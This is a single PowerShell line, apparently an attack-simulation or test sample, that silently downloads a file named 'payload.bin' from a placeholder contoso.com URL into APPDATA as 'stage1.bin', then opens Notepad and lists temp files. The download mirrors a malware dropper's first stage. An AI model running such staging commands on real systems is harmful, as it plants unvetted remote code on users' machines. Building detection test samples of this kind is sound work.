
$TargetUrl = "https://contoso.com/downloads/payload.bin"; $DownloadPath = "$env:APPDATA\stage1.bin"; curl.exe -s -L -o $DownloadPath $TargetUrl; Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
